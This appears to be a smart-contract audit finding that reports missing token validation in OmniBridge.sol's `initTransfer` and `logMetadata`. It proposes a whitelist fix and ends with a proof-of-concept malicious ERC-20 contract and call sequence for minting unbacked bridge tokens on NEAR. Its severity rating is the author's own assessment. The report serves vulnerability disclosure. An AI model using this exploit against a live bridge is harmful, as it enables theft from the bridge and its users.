### Title
Unvalidated Token Address in `initTransfer` and `logMetadata` Enables Unauthorized Minting of Bridge Tokens on NEAR — (`evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.sol`'s `initTransfer` and `logMetadata` functions accept any non-zero EVM address without checking whether it is a whitelisted or legitimate ERC-20 token. An attacker can deploy a malicious ERC-20 contract whose `transferFrom` returns `true` without moving any tokens, register it through the permissionless `logMetadata` path, and then call `initTransfer` to emit a valid `InitTransfer` event with zero actual token deposit. The NEAR bridge processes the on-chain proof of that event and mints bridge tokens for the attacker, creating unbacked supply.

---

### Finding Description

**Vulnerability class:** Token-type validation bypass / asset-accounting corruption.

In `initTransfer`, the token-type routing is:

```solidity
if (tokenAddress == address(0)) {
    // native ETH
} else {
    if (customMinters[tokenAddress] != address(0)) { … }
    else if (isBridgeToken[tokenAddress]) { … }
    else {
        // fallback: any other non-zero address treated as plain ERC-20
        IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount);
    }
}
``` [1](#0-0) 

There is no whitelist check in the `else` branch. `SafeERC20.safeTransferFrom` succeeds as long as the call does not revert and any returned `bool` is `true`. A malicious contract that returns `true` from `transferFrom` without moving tokens satisfies both conditions.

`logMetadata` is equally permissionless:

```solidity
function logMetadata(address tokenAddress) external payable {
    string memory name  = IERC20Metadata(tokenAddress).name();
    string memory symbol = IERC20Metadata(tokenAddress).symbol();
    uint8 decimals       = IERC20Metadata(tokenAddress).decimals();
    …
    emit BridgeTypes.LogMetadata(tokenAddress, name, symbol, decimals);
}
``` [2](#0-1) 

Any address that implements the three metadata getters can emit a `LogMetadata` event, which the NEAR bridge processes to deploy a new bridge token.

The NEAR bridge consumes both event types as on-chain proofs: [3](#0-2) 

---

### Impact Explanation

**Critical — unauthorized mint of bridged assets.**

The attacker mints NEAR-side bridge tokens that have no corresponding EVM-side token deposit. This breaks the bridge's collateralization invariant: the total supply of the NEAR bridge token exceeds the amount of EVM tokens actually held by the bridge. If the attacker can subsequently exchange those unbacked tokens (e.g., via a DEX listing the bridge token by address), they extract real value. Even without immediate monetization, the invariant break is permanent for that token pair and can be exploited at any scale limited only by gas cost.

---

### Likelihood Explanation

**High.** Every step is permissionless:
1. Deploying a malicious ERC-20 is a standard operation.
2. `logMetadata` has no access control.
3. `initTransfer` has no token whitelist.
4. Submitting EVM event proofs to the NEAR bridge is the normal relayer path, open to anyone.

No privileged role, leaked key, or colluding party is required.

---

### Recommendation

Add a token whitelist (analogous to the external report's recommendation) that must be satisfied before `initTransfer` accepts a token in the plain-ERC-20 fallback branch:

```solidity
mapping(address => bool) public whitelistedTokens;

function whitelistToken(address token) external onlyRole(DEFAULT_ADMIN_ROLE) {
    whitelistedTokens[token] = true;
}

// In initTransfer, replace the else-fallback with:
} else {
    require(whitelistedTokens[tokenAddress], "ERR_TOKEN_NOT_WHITELISTED");
    IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount);
}
```

Similarly, gate `logMetadata` so that only whitelisted token addresses can emit a `LogMetadata` event that the NEAR bridge will act on, or add the whitelist check inside `logMetadata` itself.

### Proof of Concept

```solidity
// 1. Attacker deploys a malicious ERC-20
contract MaliciousToken {
    function name()     external pure returns (string memory) { return "Fake USDC"; }
    function symbol()   external pure returns (string memory) { return "FUSDC"; }
    function decimals() external pure returns (uint8)         { return 6; }
    // Returns true without transferring anything
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
    function approve(address, uint256) external pure returns (bool) { return true; }
}

// 2. Register the malicious token (permissionless)
omniBridge.logMetadata(address(maliciousToken));
// → emits LogMetadata; NEAR relayer calls deploy_token → new bridge token deployed on NEAR

// 3. Initiate a transfer with zero actual deposit
omniBridge.initTransfer(
    address(maliciousToken),
    1_000_000e6,   // amount
    0,             // fee
    0,             // nativeFee
    "attacker.near",
    ""
);
// safeTransferFrom returns true without moving tokens
// → emits InitTransfer; NEAR relayer calls fin_transfer → 1,000,000 FUSDC bridge tokens minted to attacker
